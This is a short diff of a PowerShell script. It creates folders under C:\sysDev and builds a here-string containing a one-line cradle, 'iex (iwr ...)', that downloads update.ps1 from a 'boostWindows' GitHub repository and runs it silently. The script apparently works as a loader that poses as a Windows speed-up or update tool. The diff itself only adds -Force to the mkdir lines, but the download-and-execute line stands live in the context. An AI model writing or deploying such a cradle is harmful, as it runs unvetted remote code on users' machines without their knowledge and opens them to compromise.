@@ -1,5 +1,5 @@
-mkdir "C:\sysDev" | out-null
-mkdir "C:\sysDev\assets" | out-null
+mkdir "C:\sysDev" -Force | out-null
+mkdir "C:\sysDev\assets" -Force | out-null
 
 $contenuto = @'
 iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
